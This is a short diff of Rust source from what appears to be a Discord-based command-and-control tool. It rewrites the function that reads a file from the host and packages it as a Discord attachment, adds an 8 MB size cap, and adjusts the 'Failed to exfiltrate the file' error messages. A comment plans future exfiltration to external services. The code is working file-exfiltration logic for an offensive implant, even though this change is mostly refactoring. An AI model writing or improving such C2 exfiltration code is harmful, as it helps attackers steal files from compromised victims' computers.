@@ -24,7 +24,7 @@ use serenity::{
     },
 };
 
-use tokio::{fs::File, io::AsyncReadExt};
+use tokio::fs::File;
 
 use tracing::{error, info as informational};
 
@@ -91,32 +91,30 @@ async fn path_validator(file_path: &str) -> Result<PathBuf, DiscordC2Error> {
 
 // TODO: Prevent downloading files greater than 100MB
 async fn file_to_attachment(file_path: PathBuf) -> Result<AttachmentType<'static>, DiscordC2Error> {
-    let mut file = File::open(&file_path).await?;
-    let mut buffer = [0; 8912];
 
-    let _metadata = file.metadata().await?; // use this for size checks
+    // The read function will read the entire file into a Vec<u8>
+    let final_bytes = tokio::fs::read(&file_path).await?;
 
-    let mut final_bytes = Vec::new();
+    // Read the file's metadata, to determine size.
+    let file = File::open(&file_path).await?;
+    let metadata = file.metadata().await?;
 
+    // We will eventually support exfil to external services here
+    if metadata.len() >= 8 * (1024 * 1024) {
+        return Err(DiscordC2Error::InternalError(
+            format!("File size is too large: ({} MB)", metadata.len() / (1024 * 1024)
+        )));
+    }
 
     let file_name = file_path.file_name().ok_or(DiscordC2Error::InvalidInput(
         "File name not found.".to_string(),
-    ))?.to_str().ok_or(DiscordC2Error::InvalidInput("file name couldn't be converted".to_string()))?;
-
-    //TODO: reading 8kb into the file even if not necessary, this is why size checks are important
-    loop {
-        let bytes_read = file.read(&mut buffer).await?;
-        if bytes_read == 0 {
-            break;
-        }
-        final_bytes.extend_from_slice(&buffer);
-    }
+    ))?.to_str().ok_or(DiscordC2Error::InternalError("Couldn't convert the file name to a string".to_string()))?;
 
     Ok(AttachmentType::Bytes {
         data: Cow::from(final_bytes),
         filename: file_name.to_string(),
     })
-
+    
 }
 
 pub async fn download_handler(
@@ -132,7 +130,7 @@ pub async fn download_handler(
         }
         Err(reason) => {
             error!("Failed to exfiltrate the file: {}", reason);
-            send_interaction_response(ctx,&command.clone(),format!("Failed to exfiltrate the file: {}", reason),None).await?;
+            send_interaction_response(ctx,&command.clone(),format!("Failed to exfiltrate the file: `{}`", reason),None).await?;
         }
         _ => return Ok(()),
     }
